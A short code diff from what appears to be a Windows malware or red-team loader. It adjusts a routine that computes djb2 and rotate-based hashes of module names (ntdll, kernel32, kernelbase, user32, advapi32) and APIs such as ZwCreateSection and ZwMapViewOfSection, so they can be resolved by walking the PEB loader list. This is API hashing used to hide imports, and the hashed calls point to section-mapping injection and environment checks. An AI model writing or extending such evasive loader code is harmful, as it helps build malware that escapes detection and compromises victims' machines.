@@ -140,6 +140,7 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash) {
 extern "C" {
     DWORD g_Hash_ntdll = 0;
     DWORD g_Hash_kernel32 = 0;
+	DWORD g_Hash_kernelbase = 0;
     DWORD g_Hash_ZwCreateSection = 0;
     DWORD g_Hash_ZwMapViewOfSection = 0;
     DWORD g_Hash_ZwUnmapViewOfSection = 0;
@@ -213,10 +214,13 @@ CTIME_HASHA(RegOpenKeyExA)             // RegOpenKeyExA_Rotr32A
 CTIME_HASHA(RegQueryInfoKeyA)          // RegQueryInfoKeyA_Rotr32A
 CTIME_HASHA(RegCloseKey)               // RegCloseKey_Rotr32A
 void ApiHashing_InitHashes(void) {
-    // Nazwy z kropkami → bezpośredni call (patrz Problem 2):
+    /* Module names use the wide-char hasher — must match GetModuleHandleH's
+     * PEB LDR walk which hashes BaseDllName (a UNICODE_STRING). */
     g_Hash_ntdll = HashStringDjb2W(L"ntdll.dll");
     g_Hash_kernel32 = HashStringDjb2W(L"kernel32.dll");
-    // Pozostałe → użyj wygenerowanych constexpr zmiennych:
+	g_Hash_kernelbase = HashStringDjb2W(L"kernelbase.dll");
+    g_Hash_user32 = HashStringDjb2W(L"user32.dll");
+    g_Hash_advapi32 = HashStringDjb2W(L"advapi32.dll");
     g_Hash_ZwCreateSection = ZwCreateSection_Rotr32A;
     g_Hash_ZwMapViewOfSection = ZwMapViewOfSection_Rotr32A;
     g_Hash_ZwUnmapViewOfSection = ZwUnmapViewOfSection_Rotr32A;
@@ -247,11 +251,7 @@ void ApiHashing_InitHashes(void) {
     g_Hash_GetSystemInfo           = GetSystemInfo_Rotr32A;
     g_Hash_RtlComputeCrc32         = RtlComputeCrc32_Rotr32A;
     g_Hash_Sleep                   = Sleep_Rotr32A;
-    /* Module names use the wide-char hasher — must match GetModuleHandleH's
-     * PEB LDR walk which hashes BaseDllName (a UNICODE_STRING). */
-    g_Hash_user32                  = HashStringDjb2W(L"user32.dll");
     g_Hash_GetSystemMetrics        = GetSystemMetrics_Rotr32A;
-    g_Hash_advapi32                = HashStringDjb2W(L"advapi32.dll");
     g_Hash_RegOpenKeyExA           = RegOpenKeyExA_Rotr32A;
     g_Hash_RegQueryInfoKeyA        = RegQueryInfoKeyA_Rotr32A;
     g_Hash_RegCloseKey             = RegCloseKey_Rotr32A;
